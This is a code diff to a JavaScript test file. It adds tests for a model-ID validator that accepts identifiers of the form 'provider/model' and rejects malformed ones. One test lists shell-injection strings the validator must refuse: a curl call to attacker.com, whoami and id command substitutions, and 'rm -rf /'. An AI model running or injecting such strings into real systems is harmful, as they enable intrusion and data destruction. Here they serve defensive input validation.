@@ -1,8 +1,7 @@
 import { describe, expect, it } from "bun:test";
 
-const { validateServerName, validateRegionName, toKebabCase, sanitizeTermValue, jsonEscape } = await import(
-  "../shared/ui.js"
-);
+const { validateServerName, validateRegionName, validateModelId, toKebabCase, sanitizeTermValue, jsonEscape } =
+  await import("../shared/ui.js");
 
 // ── validateServerName ──────────────────────────────────────────────
 
@@ -60,6 +59,44 @@ describe("validateRegionName", () => {
     expect(validateRegionName("us east")).toBe(false);
     expect(validateRegionName("us.east")).toBe(false);
     expect(validateRegionName("us@east")).toBe(false);
+  });
+});
+
+// ── validateModelId ─────────────────────────────────────────────────
+
+describe("validateModelId", () => {
+  it("accepts valid model IDs", () => {
+    expect(validateModelId("anthropic/claude-3")).toBe(true);
+    expect(validateModelId("openai/gpt-4o")).toBe(true);
+    expect(validateModelId("moonshotai/kimi-k2.5")).toBe(true);
+    expect(validateModelId("google/gemini-pro")).toBe(true);
+    expect(validateModelId("meta-llama/llama-3.1-8b:free")).toBe(true);
+  });
+
+  it("rejects empty string", () => {
+    expect(validateModelId("")).toBe(false);
+  });
+
+  it("rejects model IDs without provider prefix", () => {
+    expect(validateModelId("claude-3")).toBe(false);
+  });
+
+  it("rejects shell injection attempts", () => {
+    expect(validateModelId('"; curl attacker.com; "')).toBe(false);
+    expect(validateModelId("$(whoami)")).toBe(false);
+    expect(validateModelId("`id`/model")).toBe(false);
+    expect(validateModelId("provider/model; rm -rf /")).toBe(false);
+    expect(validateModelId("provider/model\ninjection")).toBe(false);
+  });
+
+  it("rejects model IDs with spaces", () => {
+    expect(validateModelId("provider/model name")).toBe(false);
+  });
+
+  it("rejects model IDs starting with non-alphanumeric", () => {
+    expect(validateModelId("-provider/model")).toBe(false);
+    expect(validateModelId("/model")).toBe(false);
+    expect(validateModelId("provider/-model")).toBe(false);
   });
 });
 
